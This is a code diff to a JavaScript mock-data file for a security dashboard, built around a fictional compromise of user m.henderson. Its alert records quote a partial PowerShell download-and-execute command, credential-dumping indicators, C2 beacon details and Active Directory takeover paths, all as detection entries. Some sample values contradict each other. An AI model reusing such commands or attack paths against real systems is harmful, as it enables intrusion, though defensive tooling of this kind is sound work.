@@ -30,7 +30,6 @@ const ENTITIES = {
           'Severity':'informational',
           'Message':'User m.henderson signed in from 185.220.101.42 (Bucharest, RO — Tor exit) at 09:32 UTC, 12 min after a successful sign-in from 10.18.1.81 (Austin, US). Distance 4,500 mi · required speed ~22,500 mph.',
           'MITRE ATT&CK':'T1078.004 (Valid Accounts: Cloud)',
-          'Confidence':'92%',
           'Incident ID':'INC-2026-00142 (auto-created)'
         }
       },
@@ -109,8 +108,7 @@ const ENTITIES = {
           'Domain':'corp.local',
           'Severity':'warning',
           'Message':'54 gratuitous ARP replies from MAC 00:1A:2B:3C:4D:5E (CORP-WS-045) in 28s, spoofing 10.18.1.1 (gateway) on segment 10.18.1.0/24. Affected: m.henderson, j.williams, s.chen.',
-          'MITRE ATT&CK':'T1557.002 (ARP Cache Poisoning)',
-          'Confidence':'96%'
+          'MITRE ATT&CK':'T1557.002 (ARP Cache Poisoning)'
         }
       },
       triggerConditions: {
@@ -149,8 +147,7 @@ const ENTITIES = {
           'Domain':'corp.local',
           'Severity':'warning',
           'Message':'48 gratuitous ARP replies from MAC 00:1A:2B:3C:4D:5E (CORP-WS-045) in 32s, spoofing 10.18.1.1 (gateway). Affected: m.henderson (primary), j.williams.',
-          'MITRE ATT&CK':'T1557.002 (ARP Cache Poisoning)',
-          'Confidence':'94%'
+          'MITRE ATT&CK':'T1557.002 (ARP Cache Poisoning)'
         }
       },
       triggerConditions: {
@@ -189,8 +186,7 @@ const ENTITIES = {
           'Domain':'corp.local',
           'Severity':'warning',
           'Message':'OAuth 2.0 bearer token issued to app "FileSync Pro" (unverified publisher) for user m.henderson with scopes Mail.ReadWrite, Files.ReadWrite.All, User.Read from 185.220.101.42 (Tor). User-self-consented (no admin consent).',
-          'MITRE ATT&CK':'T1550.001 (Application Access Token)',
-          'Confidence':'89%'
+          'MITRE ATT&CK':'T1550.001 (Application Access Token)'
         }
       },
       triggerConditions: {
@@ -198,9 +194,9 @@ const ENTITIES = {
         kv: {
           'Rule':'CLD-OAUTH-002 — Broad Scope from Untrusted App',
           'Condition':'Unregistered app + Files.ReadWrite.All + risky IP',
-          'User Self-Consented':'Yes ⚠',
+          'User Self-Consented':'Yes',
           'Admin Consent':'No',
-          'Publisher Verified':'No ✗'
+          'Publisher Verified':'No'
         }
       },
       affectedEntities: {
@@ -233,8 +229,7 @@ const ENTITIES = {
           'Domain':'corp.local',
           'Severity':'informational',
           'Message':'User m.henderson granted consent to app "FileSync Pro" with permissions Mail.ReadWrite, Files.ReadWrite.All. Publisher unverified, app not in approved catalog.',
-          'MITRE ATT&CK':'T1098.003 (Additional Cloud Roles)',
-          'Confidence':'78%'
+          'MITRE ATT&CK':'T1098.003 (Additional Cloud Roles)'
         }
       },
       triggerConditions: {
@@ -278,8 +273,7 @@ const ENTITIES = {
           'LogonId':'0x38fefcab5',
           'Severity':'warning',
           'Message':'powershell.exe (PID 4892) launched by powershell.exe (PID 3104) with flags -NoProfile -WindowStyle Hidden -EncodedCommand. Decoded: IEX (New-Object Net.WebClient).DownloadString(...). AMSI_RESULT_DETECTED (3 events).',
-          'MITRE ATT&CK':'T1059.001 (PowerShell)',
-          'Confidence':'97%'
+          'MITRE ATT&CK':'T1059.001 (PowerShell)'
         }
       },
       triggerConditions: {
@@ -323,8 +317,7 @@ const ENTITIES = {
           'LogonId':'0x38fefcab5',
           'Severity':'warning',
           'Message':'Non-SYSTEM process powershell.exe (PID 4892, medium-IL) read C:\\Windows\\System32\\config\\SAM. Invoke-Mimikatz indicator detected via AMSI.',
-          'MITRE ATT&CK':'T1003 (OS Credential Dumping)',
-          'Confidence':'94%'
+          'MITRE ATT&CK':'T1003 (OS Credential Dumping)'
         }
       },
       triggerConditions: {
@@ -366,8 +359,7 @@ const ENTITIES = {
           'Domain':'corp.local',
           'Severity':'warning',
           'Message':'powershell.exe (PID 4892) on CORP-WS-045 established outbound HTTPS to 185.220.101.42:443 (Tor exit, c2-relay.onion.ws). AbuseIPDB 98% · VirusTotal 12/89 · 60s beacon interval, consistent payload size.',
-          'MITRE ATT&CK':'T1071 (Application Layer Protocol)',
-          'Confidence':'96%'
+          'MITRE ATT&CK':'T1071 (Application Layer Protocol)'
         }
       },
       triggerConditions: {
@@ -411,8 +403,7 @@ const ENTITIES = {
           'LogonId':'0x38fefcab5',
           'Severity':'warning',
           'Message':'New service "WinUpdateSvc" installed via sc.exe create from powershell.exe. Binary path C:\\Windows\\Temp\\wuhelper.exe (unsigned, temp directory). Name resembles legitimate wuauserv (masquerading).',
-          'MITRE ATT&CK':'T1543.003 (Create/Modify System Process)',
-          'Confidence':'91%'
+          'MITRE ATT&CK':'T1543.003 (Create/Modify System Process)'
         }
       },
       triggerConditions: {
@@ -454,8 +445,7 @@ const ENTITIES = {
           'Domain':'corp.local',
           'Severity':'warning',
           'Message':'Service WinUpdateSvc (wuhelper.exe) on CORP-WS-045 opened HTTPS to 185.220.101.42:443 (known Tor exit). 60s beacon interval.',
-          'MITRE ATT&CK':'T1071 (Application Layer Protocol)',
-          'Confidence':'98%'
+          'MITRE ATT&CK':'T1071 (Application Layer Protocol)'
         }
       },
       triggerConditions: {
@@ -497,8 +487,7 @@ const ENTITIES = {
           'Domain':'corp.local',
           'Severity':'warning',
           'Message':'wuhelper.exe (WinUpdateSvc) on CORP-WS-045 sent 248 MB via plaintext HTTP to 91.215.85.12:8080 in a single session. Threshold 100 MB. Data source: SharePoint files staged locally.',
-          'MITRE ATT&CK':'T1041 (Exfiltration Over C2 Channel)',
-          'Confidence':'93%'
+          'MITRE ATT&CK':'T1041 (Exfiltration Over C2 Channel)'
         }
       },
       triggerConditions: {
@@ -507,7 +496,7 @@ const ENTITIES = {
           'Rule':'DLP-EXFIL-003 — Large Outbound Transfer to Untrusted Host',
           'Threshold':'>100 MB to unknown destination',
           'Actual':'248 MB in single session',
-          'Protocol':'HTTP (unencrypted) ⚠',
+          'Protocol':'HTTP (unencrypted)',
           'Source Process':'wuhelper.exe (WinUpdateSvc)'
         }
       },
@@ -541,8 +530,7 @@ const ENTITIES = {
           'Domain':'corp.local',
           'Severity':'warning',
           'Message':'User m.henderson downloaded 142 files (2.3 GB) from SharePoint sites Finance-Reports, HR-Confidential, Project-Atlas in 4 min from 185.220.101.42. Baseline 8 files/day · 17.75x deviation.',
-          'MITRE ATT&CK':'T1530 (Data from Cloud Storage)',
-          'Confidence':'95%'
+          'MITRE ATT&CK':'T1530 (Data from Cloud Storage)'
         }
       },
       triggerConditions: {
@@ -585,8 +573,7 @@ const ENTITIES = {
           'Domain':'corp.local',
           'Severity':'warning',
           'Message':'User m.henderson opened Q4-Revenue-Projections.xlsx (Confidential — Finance) and Employee-Compensation-2026.xlsx (Highly Confidential — HR). 8 files with sensitivity labels affected. Classification: PII + Financial.',
-          'MITRE ATT&CK':'T1213.002 (Data from Information Repositories: SharePoint)',
-          'Confidence':'88%'
+          'MITRE ATT&CK':'T1213.002 (Data from Information Repositories: SharePoint)'
         }
       },
       triggerConditions: {
@@ -631,8 +618,7 @@ const ENTITIES = {
           'LogonId':'0x21a4f8c',
           'Severity':'informational',
           'Message':'Global Administrator "admin" logged on to DC-01 from 10.0.0.5 at 21:15 — outside business hours (06:00–18:00 Mon–Fri). MFA: hardware token verified. Resolved — admin confirmed emergency maintenance.',
-          'MITRE ATT&CK':'T1078 (Valid Accounts)',
-          'Confidence':'62%'
+          'MITRE ATT&CK':'T1078 (Valid Accounts)'
         }
       },
       triggerConditions: {
@@ -641,7 +627,7 @@ const ENTITIES = {
           'Rule':'UEBA-ADMIN-001 — Privileged Login Off-Hours',
           'Business Hours':'06:00 — 18:00 (Mon-Fri)',
           'Login Time':'21:15 (outside business hours)',
-          'MFA':'Hardware token ✓',
+          'MFA':'Hardware token',
           'Note':'Resolved — admin confirmed emergency maintenance'
         }
       },
@@ -661,24 +647,64 @@ const ENTITIES = {
           maxScore: 100,
           severity: 'Critical',
           statusBadge: 'Compromised Account',
+          // UB1 Risk Summary KPI strip (user_entity_spec.md §3.2): Total Events (24h),
+          // Failed Logins (24h), Recent Alerts (7d), Off-Hours Logins (7d).
           metrics: [
-            { icon:'⚠', label:'Anomalies (session / lifetime)', value:'7 / 47', color:'#DD1616' },
+            { icon:'📊', label:'Total Events (24h)', value:'1,284', color:'#6366B3' },
             { icon:'🔐', label:'Failed Logins (24h)', value:'4', color:'#FF5900' },
-            { icon:'⏱', label:'Last Anomaly', value:'', color:'#6366B3', dynamic:'lastAnomaly' }
+            { icon:'🔔', label:'Recent Alerts (7d)', value:'2', color:'#DD1616' },
+            { icon:'🌙', label:'Off-Hours Logins (7d)', value:'2', color:'#FF5900' }
           ],
-          // Hero chip: single honest field backed by ADSUserDetails.lastLogonTime (real DB column,
-          // not retention-bounded). Replaces the prior 'First Seen / Last Activity' pair which was
-          // sourced from ES min/max(@timestamp) and silently truncated by log retention.
-          // See entity_data_mapping.md §1.1.
+          // Conditional chips (UEBA-gated): Risk Score is the hero score above; Anomaly Count (7d)
+          // and Last Logon (backed by ADSUserDetails.lastLogonTime, retention-safe) shown as chips.
           heroChips: [
-            { label:'Last Logon', value:'11 May 2026 09:41:10' }
+            { label:'Last Logon', value:'11 May 2026 09:41:10' },
+            { label:'Anomaly Count (7d)', value:'7' }
           ],
           lastAnomaly: '11 May 2026 10:36:22'
         }
       },
+      // UB2 User Details — tiered identity card (user_entity_spec.md §3.2). Tier 1 Core,
+      // Tier 2 Account State (folds former identityRisk), Tier 3 Provenance (AD),
+      // Tier 4 Hybrid/Entra (folds former cloudIdentities).
       usersDetails: {
         label: 'User Details', expanded: true,
-        kv: { 'Display Name':'m.henderson', 'SAM Account Name':'m.henderson', 'UPN':'m.henderson@contoso.com', 'Email':'m.henderson@corp.local', 'Job Title':'IT Support Engineer', 'Department':'IT', 'Manager':'j.williams (IT Manager)', 'Last Logon Time':'09:41:10', 'OU Name':'OU 1', 'Account Created':'2024-03-15', 'Account Status':'Active ⚠ (Recommended: Disable)', 'Primary Group':'Domain Users' }
+        kv: {
+          // ── Tier 1 · Core Identity ──
+          'Display Name':'m.henderson',
+          'SAM Account Name':'m.henderson',
+          'UPN / Logon Name':'m.henderson@contoso.com',
+          'Email':'m.henderson@corp.local',
+          'Job Title':'IT Support Engineer',
+          'Department':'IT',
+          'Manager':'j.williams (IT Manager)',
+          'OU Name':'OU=IT,DC=contoso,DC=local',
+          'Account Created':'2024-03-15',
+          // ── Tier 2 · Account State ──
+          'Account Status':'Active',
+          'Lockout Time':'11 May 2026 09:30:55',
+          'Bad Password Count':'0',
+          'Password Last Set':'2026-03-25',
+          'Password Never Expires':'No',
+          'Account Expiry':'Never',
+          'Smartcard Required':'No',
+          'Trusted for Delegation':'No',
+          'Days Since Last Logon':'0',
+          // ── Tier 3 · Provenance (AD) ──
+          'Distinguished Name':'CN=m.henderson,OU=IT,DC=contoso,DC=local',
+          'SID':'S-1-5-21-3623811015-3361044348-30300820-1147',
+          'Object GUID':'a1b2c3d4-5e6f-7a8b-9c0d-1e2f3a4b5c6d',
+          'Primary Group':'Domain Users',
+          'Domain':'contoso.local',
+          // ── Tier 4 · Hybrid / Entra ──
+          'O365 User Type':'Member',
+          'Licensed':'Yes',
+          'Strong Password Required':'Yes',
+          'Last Dir Sync':'2026-05-31 02:14:00',
+          'On-Prem Sync Enabled':'Yes',
+          'Litigation Hold':'No',
+          'Hidden From Address List':'No'
+        }
       },
       logonActivity: {
         label: 'Logon Activity', expanded: true, viewAll: true,
@@ -771,13 +797,17 @@ const ENTITIES = {
             details: { 'Host':'CORP-WS-045', 'File Name':'financial_records.txt', 'Location':'c:\\restricted share\\secret', 'Change Type':'Created' } }
         ]
       },
+      // UE1 UEBA Risk Profile (user_entity_spec.md §3.3): Risk_Score, Score_Trend (7d),
+      // Last_Anomaly_Time, Anomaly_Count_By_Type (top-3), Watchlisted_Status, Analyst_Notes.
       uebaProfile: {
         label: 'UEBA Risk Profile', expanded: false,
         kv: {
           'Risk Score':'94 / 100 — Critical',
+          'Score Trend (7d)':'12 → 28 → 41 → 41 → 63 → 88 → 94 ▲',
           'Last Anomaly Fired':'12 May 2026 09:14 (2h ago)',
+          'Anomaly Count By Type':'Impossible Travel (3), Off-Hours Access (2), Mass File Download (2)',
           'Last Score Update':'13 May 2026 03:00',
-          'Under Observation':'Yes',
+          'Watchlisted':'Yes (Under Observation)',
           'Source':'Windows Event Log Collector',
           'Analyst Notes':'"Investigated 11 May — escalated to T2" — j.doe, 11 May'
         }
@@ -793,30 +823,36 @@ const ENTITIES = {
           'Unique Hosts':'3 (CORP-WS-045, CORP-SRV-01, CORP-FS-02)'
         }
       },
-      cloudIdentities: {
-        label: 'Cloud Identities & Assets', expanded: false,
+      // UE12 Privileged Action Surface (user_entity_spec.md §3.3).
+      privilegedSurface: {
+        label: 'Privileged Action Surface', expanded: false,
         kv: {
-          'UPN':'m.henderson@contoso.com',
-          'Sync Source':'Hybrid (synced from on-prem AD)',
-          'Cloud Account':'Enabled · Licensed',
-          'Last Dir Sync':'2 days ago',
-          'Strong Password Required':'Yes',
-          'Days Since Password Change':'47',
-          'Hidden From Address List':'No (visible in GAL)'
+          'Is Privileged':'Yes (via transitive Tier-0 path)',
+          'Privileged Path':'IT-Support → SVC_Backup → DCSync rights',
+          'MFA Required':'No (gap — privileged path unprotected)',
+          'Last Privileged Action':'11 May 2026 10:36:22 (SAM dump attempt)',
+          'Standing vs JIT (PIM)':'Standing (not PIM-eligible)'
         }
       },
-      identityRisk: {
-        label: 'Identity Risk Assessment', expanded: false,
-        kv: {
-          'Password Age':'47 days',
-          'Days Since Last Logon':'2',
-          'Account Status':'Enabled',
-          'Password Never Expires':'No',
-          'Smartcard Required':'No',
-          'Trusted for Kerberos Delegation':'No',
-          'Bad Password Count':'0',
-          'Privileged Group Membership':'None'
-        }
+      // UE7 Effective Group Memberships — transitive (user_entity_spec.md §3.3).
+      effectiveGroups: {
+        label: 'Effective Group Memberships (transitive)', expanded: false, viewAll: true,
+        timeline: [
+          { time:'Direct', dot:'green', details: { 'Group':'Domain Users', 'Type':'Security · Built-in', 'Path':'Direct', 'Tier-0':'No' } },
+          { time:'Direct', dot:'green', details: { 'Group':'IT-Support', 'Type':'Security · Global', 'Path':'Direct', 'Tier-0':'No' } },
+          { time:'Direct', dot:'green', details: { 'Group':'VPN-Users', 'Type':'Security · Global', 'Path':'Direct', 'Tier-0':'No' } },
+          { time:'Direct', dot:'red', malicious:true, details: { 'Group':'SharePoint-Finance-Editors', 'Type':'Security · M365', 'Path':'Direct (added 11 May 09:35 — suspicious)', 'Tier-0':'No' } },
+          { time:'Transitive', dot:'red', malicious:true, details: { 'Group':'Backup Operators', 'Type':'Security · Built-in', 'Path':'via IT-Support → SVC_Backup', 'Tier-0':'Yes' } }
+        ]
+      },
+      // UE8 Direct Reports & Manager Chain (user_entity_spec.md §3.3).
+      directReports: {
+        label: 'Direct Reports & Manager Chain', expanded: false,
+        timeline: [
+          { time:'Manager (↑1)', dot:'green', details: { 'Name':'j.williams', 'Title':'IT Manager', 'Department':'IT' } },
+          { time:'This User', dot:'orange', details: { 'Name':'m.henderson', 'Title':'IT Support Engineer', 'Department':'IT' } },
+          { time:'Direct Reports (↓1)', dot:'green', details: { 'Reports':'None — individual contributor' } }
+        ]
       },
       accountLockouts: {
         label: 'Account Lockout History', expanded: false, viewAll: true,
@@ -848,6 +884,38 @@ const ENTITIES = {
           { time:'10 Oct 2025  11:30:00', dot:'green',
             details: { 'Operation':'Add member to group', 'Group':'IT-Support', 'Caller':'admin@contoso.com', 'Source':'On-Premises AD (4732)' } }
         ]
+      },
+      blastRadius: {
+        label: 'Blast Radius & Asset Exposure', expanded: true,
+        blastRadius: {
+          seed: { name:'m.henderson', type:'User', domain:'corp.local', tier:'Tier 2' },
+          stats: { outgoingPaths: 3, incomingPaths: 2, crownJewels: 1, minHops: 2, tier0Reached: true },
+          // Blast radius — if m.henderson is compromised, what AD objects fall.
+          outgoing: [
+            { target:'corp.local — DC hashes', crownJewel:true, hops:[
+              { from:'m.henderson', rel:'MEMBEROF', to:'IT-Support' },
+              { from:'IT-Support', rel:'GENERIC_ALL', to:'SVC_Backup' },
+              { from:'SVC_Backup', rel:'DC_SYNC_RIGHTS', to:'corp.local' }
+            ] },
+            { target:'Finance-Sensitive (SharePoint)', hops:[
+              { from:'m.henderson', rel:'ADD_MEMBER', to:'SharePoint-Finance-Editors' },
+              { from:'SharePoint-Finance-Editors', rel:'GENERIC_WRITE', to:'Finance-Sensitive' }
+            ] },
+            { target:'svc-sql (Kerberoast)', hops:[
+              { from:'m.henderson', rel:'WRITE_SPN', to:'svc-sql' }
+            ] }
+          ],
+          // Asset exposure — principals that can take over m.henderson.
+          incoming: [
+            { source:'helpdesk-tier1', hops:[
+              { from:'helpdesk-tier1', rel:'RESET_PASSWORD', to:'m.henderson' }
+            ] },
+            { source:'OU-Admins (IT-OU)', hops:[
+              { from:'OU-Admins', rel:'GENERIC_ALL', to:'OU=IT' },
+              { from:'OU=IT', rel:'ADD_KEY_CREDENTIAL', to:'m.henderson' }
+            ] }
+          ]
+        }
       },
       mailboxForwarding: {
         label: 'Mailbox Forwarding Rules', expanded: false, viewAll: true,
@@ -883,17 +951,16 @@ const ENTITIES = {
             details: { 'Type':'VPN Connection', 'Source IP':'72.14.201.88 (NY Office ISP)', 'Assigned IP':'10.18.1.81', 'Protocol':'IPSec', 'Duration':'5h 22m' } }
         ]
       },
-      threatIntelContext: {
-        label: 'Threat Intelligence Context', expanded: false,
-        kv: {
-          'Primary IOC':'185.220.101.42 (Tor Exit Node)',
-          'Reputation Verdict':'2 — Malicious',
-          'Threat Category':'C2 / Tor Exit Node',
-          'Threat Feed':'Webroot BrightCloud',
-          'First Seen (Local)':'2025-11-22',
-          'VirusTotal':'12/94 vendors flagged (ATA add-on)',
-          'MITRE Techniques':'T1071.001 (Web Protocols), T1041 (Exfil Over C2), T1557.002 (ARP Poisoning)'
-        }
+      // UE3 TI — Dark Web / Breach Exposure (user_entity_spec.md §3.3). License + Constella
+      // gated; keyed on EMAIL_ADDRESS (m.henderson@corp.local). Per-breach records.
+      darkWebExposure: {
+        label: 'Dark Web / Breach Exposure', expanded: false, viewAll: true,
+        timeline: [
+          { time:'2021-06-22', dot:'red', malicious:true,
+            details: { 'Source':'LinkedIn Scrape', 'Region':'Global', 'Type':'Credential Database', 'Confidence':'High', 'Severity':'High', 'Validated':'Yes', 'Password (last 4)':'••••3z9!', 'Encryption':'bcrypt', 'Category':'Professional Network', 'Recommendation':'Force password reset + enforce MFA' } },
+          { time:'2019-05-10', dot:'orange',
+            details: { 'Source':'Collection #1', 'Region':'Global', 'Type':'Combolist', 'Confidence':'Medium', 'Severity':'Medium', 'Validated':'Yes', 'Password (last 4)':'••••er12', 'Encryption':'plaintext', 'Category':'Aggregated Breach', 'Recommendation':'Confirm password rotated since 2019' } }
+        ]
       },
       remediationGuide: {
         label: 'Recommendations & Remediation', expanded: true, noCollapse: true,
@@ -938,7 +1005,7 @@ const ENTITIES = {
         label: 'OAuth App Consent Grants', expanded: false, viewAll: true,
         timeline: [
           { time:'11 May 2026  09:33:15', dot:'red', malicious: true,
-            details: { 'Operation':'Consent to application', 'App':'FileSync Pro ⚠ (Unverified publisher)', 'Consenting User':'m.henderson', 'Permissions':'Files.ReadWrite.All, Mail.ReadWrite', 'Source IP':'185.220.101.42 (Tor)', 'Admin Consent':'No — user self-consented' } },
+            details: { 'Operation':'Consent to application', 'App':'FileSync Pro (Unverified publisher)', 'Consenting User':'m.henderson', 'Permissions':'Files.ReadWrite.All, Mail.ReadWrite', 'Source IP':'185.220.101.42 (Tor)', 'Admin Consent':'No — user self-consented' } },
           { time:'15 Apr 2026  09:00:00', dot:'green',
             details: { 'Operation':'Add delegated permission grant', 'App':'Microsoft Teams', 'Consenting User':'admin@contoso.com', 'Permissions':'User.Read, Chat.ReadWrite', 'Source IP':'10.0.0.5 (Admin-WS)', 'Admin Consent':'Yes' } }
         ]
@@ -960,7 +1027,7 @@ const ENTITIES = {
           { time:'01 Apr 2025  10:00:00', dot:'green',
             details: { 'State':'Enabled', 'Scope':'All users', 'Conditions':'All cloud apps', 'Grant':'Require MFA', 'Exclusions':'Break-glass accounts', 'Last Modified':'2025-04-01' } },
           { time:'15 Mar 2025  09:30:00', dot:'red',
-            details: { 'State':'Report-Only ⚠ (Not enforced)', 'Scope':'All users', 'Conditions':'Exchange ActiveSync, Other Clients', 'Grant':'Block', 'Impact':'Would block 142 connections/week', 'Last Modified':'2025-03-15' } },
+            details: { 'State':'Report-Only (Not enforced)', 'Scope':'All users', 'Conditions':'Exchange ActiveSync, Other Clients', 'Grant':'Block', 'Impact':'Would block 142 connections/week', 'Last Modified':'2025-03-15' } },
           { time:'20 May 2025  11:15:00', dot:'green',
             details: { 'State':'Enabled', 'Scope':'All users', 'Conditions':'Sign-in risk: Medium, High', 'Grant':'Require MFA + password change', 'Exclusions':'None', 'Last Modified':'2025-05-20' } }
         ]
@@ -1050,10 +1117,10 @@ const ENTITIES = {
           severity: 'Critical',
           statusBadge: 'Known Malicious IP',
           metrics: [
-            { icon:'🌐', label:'Tor Exit Node', value:'Confirmed', color:'#DD1616' },
-            { icon:'⚠', label:'Threat Feeds Flagged', value:'5', color:'#DD1616' },
-            { icon:'🔗', label:'Active Connections', value:'4', color:'#FF5900' },
-            { icon:'🦠', label:'VirusTotal Detections', value:'12/89', color:'#FF5900' }
+            { icon:'🌐', label:'Network Zone', value:'External', color:'#DD1616' },
+            { icon:'🔗', label:'Distinct Peers (24h)', value:'1', color:'#FF5900' },
+            { icon:'📡', label:'Traffic (24h)', value:'858 KB', color:'#FF5900' },
+            { icon:'⚠', label:'Threat Feeds Flagged', value:'3', color:'#DD1616' }
           ]
         }
       },
@@ -1062,14 +1129,11 @@ const ENTITIES = {
         kv: {
           'IP Address':'185.220.101.42',
           'Network Type':'Tor Exit Relay',
-          'Country / City':'Romania 🇷🇴 — Bucharest',
+          'Country / City':'Romania — Bucharest',
           'ASN / Org':'AS9009 (M247 Europe SRL)',
           'Reverse DNS (PTR)':'tor-exit-bucharest-01.m247.com',
           'VPN / Proxy':'Yes — Tor Exit Node',
-          'Threat Feed Match':'Listed (Webroot BrightCloud, Anomali, OTX)',
-          'Firewall Events (24h)':'47 (35 denied, 12 allowed)',
-          'Top Transport Protocols':'tcp (41), udp (5), icmp (1)',
-          'Top Destination Ports':'443 (38), 8080 (6), 53 (3)'
+          'Threat Feed Match':'Listed (Webroot BrightCloud, Anomali, OTX)'
         }
       },
       threatIntelligence: {
@@ -1099,7 +1163,7 @@ const ENTITIES = {
         label: 'Firewall Action Summary', expanded: false,
         kv: {
           'Total Flows':'47',
-          'Allowed':'12 ⚠ (pre-block)',
+          'Allowed':'12 (pre-block)',
           'Denied':'35 (post-block)',
           'Top Destination Ports':'443 (38), 8080 (6), 53 (3)',
           'Top Transport Protocols':'tcp (44), udp (3)',
@@ -1158,12 +1222,30 @@ const ENTITIES = {
             details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'Azure Portal', 'Result':'Success', 'Risk Level':'High', 'Location':'Bucharest, Romania' } },
           { time:'11 May 2026  09:33:45', dot:'red', malicious: true,
             details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'SharePoint Online', 'Result':'Success', 'Risk Level':'High', 'Location':'Bucharest, Romania' } },
-          { time:'11 May 2026  10:37:01', dot:'red', malicious: true,
-            details: { 'User':'m.henderson', 'Logon Type':'Outbound C2 Connection', 'Source App':'powershell.exe', 'MFA':'N/A', 'Result':'Connected — 12s', 'Risk Level':'Critical', 'Location':'Bucharest, Romania' } },
           { time:'10 May 2026  21:15:33', dot:'orange',
             details: { 'User':'unknown', 'Logon Type':'Failed Sign-In Attempt', 'Source App':'Azure Portal', 'MFA':'Not reached', 'Result':'Failure — Invalid password', 'Risk Level':'Medium', 'Location':'Bucharest, Romania' } },
           { time:'10 May 2026  18:40:11', dot:'orange',
             details: { 'User':'j.williams', 'Logon Type':'Failed Sign-In Attempt', 'Source App':'Exchange Online', 'MFA':'Not reached', 'Result':'Failure — Account locked', 'Risk Level':'Medium', 'Location':'Bucharest, Romania' } }
+        ]
+      },
+      recentAlerts: {
+        label: 'Recent Alerts', expanded: true, viewAll: true,
+        timeline: [
+          { time:'11 May 2026  10:36:50', dot:'red',
+            viewOnGraph: { nodeId:'ip-tor', label:'185.220.101.42 (Tor)', icon:'🌐', sourceEntity:'proc-powershell' },
+            detailsGrid: [
+              { label:'10:36:50 C2 / Tor Exit Connection', value:'Cobalt Strike Beacon', tag:'Type', tagVal:'Network Threat', mitre:'T1071.001 (Application Layer Protocol: Web)', source:'Palo Alto IDS', status:'Open', severity:'Critical' }
+            ] },
+          { time:'11 May 2026  10:37:02', dot:'red',
+            viewOnGraph: { nodeId:'ip-tor', label:'185.220.101.42 (Tor)', icon:'🌐', sourceEntity:'proc-powershell' },
+            detailsGrid: [
+              { label:'10:37:02 Tor Exit Node Traffic', value:'Anonymizer / Tor', tag:'Type', tagVal:'Network Threat', mitre:'T1090.003 (Multi-hop Proxy)', source:'CheckPoint-GW-01', status:'Open', severity:'High' }
+            ] },
+          { time:'11 May 2026  09:32:15', dot:'orange',
+            viewOnGraph: { nodeId:'ip-tor', label:'185.220.101.42 (Tor)', icon:'🌐', sourceEntity:'proc-powershell' },
+            detailsGrid: [
+              { label:'09:32:15 Port-Scan / IPS Signature', value:'anomaly.tcp.unexpected-flag', tag:'Type', tagVal:'IDS/IPS', mitre:'T1046 (Network Service Discovery)', source:'FortiGate-100F', status:'Open', severity:'Medium' }
+            ] }
         ]
       },
       remediationGuide: {
@@ -1172,7 +1254,7 @@ const ENTITIES = {
           verdict: 'Malicious — Known Tor Exit Node / C2 Infrastructure',
           severity: 'critical',
           recommendations: [
-            { icon:'�', title:'Investigate Historical Connections', desc:'Search 90-day firewall, proxy, and VPN logs for any prior connections to 185.220.101.42. Determine if this is a first-time contact or a long-running C2 channel.', priority:'Critical' },
+            { icon:'🕵️', title:'Investigate Historical Connections', desc:'Search 90-day firewall, proxy, and VPN logs for any prior connections to 185.220.101.42. Determine if this is a first-time contact or a long-running C2 channel.', priority:'Critical' },
             { icon:'🧩', title:'Assess IP Role in Attack Chain', desc:'Determine if this Tor exit node was used as the entry point (stolen creds from Tor), the C2 relay, or the exfiltration destination. The role determines remediation priority.', priority:'Critical' },
             { icon:'📊', title:'Cross-Reference with Threat Intel', desc:'Check 185.220.101.42 against ThreatFox, AbuseIPDB, VirusTotal, and internal TI platforms. Identify associated campaigns, APT groups, or malware families.', priority:'High' },
             { icon:'📝', title:'Map the C2 Infrastructure', desc:'Investigate c2-update.darkoperator.net — DNS history, passive DNS, WHOIS. Is there a broader C2 infrastructure with additional domains/IPs?', priority:'High' },
@@ -1198,10 +1280,9 @@ const ENTITIES = {
           severity: 'Low',
           metrics: [
             { icon:'🏢', label:'Network Zone', value:'Internal', color:'#198019' },
-            { icon:'🔗', label:'Unique Destinations', value:'34', color:'#0891b2' },
-            { icon:'⚠', label:'Anomalous Flows', value:'2', color:'#D14900' },
-            { icon:'👤', label:'Assigned User', value:'m.henderson', color:'#6366B3' },
-            { icon:'📡', label:'Traffic (24h)', value:'1.45 GB', color:'#0891b2' }
+            { icon:'🔗', label:'Distinct Peers (24h)', value:'34', color:'#0891b2' },
+            { icon:'📡', label:'Traffic (24h)', value:'1.45 GB', color:'#0891b2' },
+            { icon:'⚠', label:'Threat Feeds Flagged', value:'0', color:'#198019' }
           ]
         }
       },
@@ -1228,7 +1309,7 @@ const ENTITIES = {
         label: 'Associated Users', expanded: true, viewAll: true,
         timeline: [
           { time:'11 May 2026  09:20:00', dot:'green',
-            details: { 'User':'m.henderson', 'Action':'Azure AD sign-in', 'Result':'Success', 'MFA':'Push approved', 'Location':'NYC Office' } },
+            details: { 'User':'m.henderson', 'Action':'Azure AD sign-in', 'Result':'Success', 'MFA':'Push approved', 'Location':'New York, NY, USA' } },
           { time:'11 May 2026  10:15:22', dot:'green',
             details: { 'User':'m.henderson', 'Action':'Interactive logon', 'Result':'Success', 'Source':'CORP-WS-045' } },
           { time:'10 May 2026  09:05:11', dot:'green',
@@ -1268,7 +1349,7 @@ const ENTITIES = {
           'External Traffic':'8% (Azure, Microsoft CDN)',
           'Bytes Sent':'248 MB',
           'Bytes Received':'1.2 GB',
-          'Anomalous Flows':'2 (to Tor exit relay ⚠)',
+          'Anomalous Flows':'2 (to Tor exit relay)',
           'Blocked Connections':'0'
         }
       },
@@ -1285,23 +1366,34 @@ const ENTITIES = {
         label: 'Logon Activity', expanded: false, viewAll: true,
         timeline: [
           { time:'11 May 2026  09:20:05', dot:'green',
-            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'Outlook Web', 'MFA':'Push notification approved', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } },
+            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'Outlook Web', 'MFA':'Push notification approved', 'Result':'Success', 'Risk Level':'None', 'Location':'New York, NY, USA' } },
           { time:'11 May 2026  10:15:22', dot:'green',
-            details: { 'User':'m.henderson', 'Logon Type':'Interactive Logon', 'Source App':'Windows Logon (CORP-WS-045)', 'MFA':'N/A (domain auth)', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } },
+            details: { 'User':'m.henderson', 'Logon Type':'Interactive Logon', 'Source App':'Windows Logon (CORP-WS-045)', 'MFA':'N/A (domain auth)', 'Result':'Success', 'Risk Level':'None', 'Location':'—' } },
           { time:'10 May 2026  09:05:11', dot:'green',
